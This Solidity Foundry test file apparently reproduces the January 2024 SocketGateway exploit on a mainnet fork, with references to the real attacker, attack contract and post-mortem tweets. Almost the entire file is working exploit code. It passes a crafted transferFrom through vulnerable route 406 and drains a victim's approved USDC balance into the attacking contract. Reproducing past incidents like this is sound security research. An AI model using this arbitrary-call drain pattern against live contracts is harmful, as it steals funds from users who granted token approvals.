// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "./../interface.sol";

interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
}

interface ISocketVulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData
    ) external payable returns (uint256);
}


// @KeyInfo - Total Lost : ~3.3M US$
// Attacker : https://etherscan.io/address/0x50DF5a2217588772471B84aDBbe4194A2Ed39066
// Attack Contract : https://etherscan.io/address/0xf2D5951bB0A4d14BdcC37b66f919f9A1009C05d1
// Vulnerable Contract : https://etherscan.io/address/0x3a23F943181408EAC424116Af7b7790c94Cb97a5 (the faulty route is vulnerable not the gateway itself)
// Attack Tx : https://etherscan.io/tx/0xc6c3331fa8c2d30e1ef208424c08c039a89e510df2fb6ae31e5aa40722e28fd6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e#code

// @Analysis
// Post-mortem :https://twitter.com/BeosinAlert/status/1747450173675196674
// Twitter Guy : https://twitter.com/peckshield/status/1747353782004900274

//In this example i didnt do a batch transferfrom for multiple target addresses,just did one for simplicity
contract SocketGatewayExp is BaseTestWithBalanceLog {
    address _gateway = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
    uint32 routeId = 406; //Recently added vulnerable route id

    ISocketGateway gateway = ISocketGateway(_gateway);
    IERC20 USDC = IERC20(_usdc);

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 19_021_453);
        USDC.approve(_gateway, type(uint256).max);
        fundingToken = _usdc;
    }

    function getCallData(address token, address user) internal view returns (bytes memory callDataX) {
        require(IERC20(token).balanceOf(user) > 0, "no amount of usdc for user");
        callDataX =
            abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), IERC20(token).balanceOf(user));
    }

    function getRouteData(address token, address user) internal view returns (bytes memory callDataX2) {
        callDataX2 = abi.encodeWithSelector(
            ISocketVulnRoute.performAction.selector,
            token,
            token,
            0,
            address(this),
            bytes32(""),
            getCallData(_usdc, user)
        );
    }

    function testExploit() public balanceLog {
        gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));
        require(USDC.balanceOf(address(this)) > 0, "no usdc gotten");
    }
}
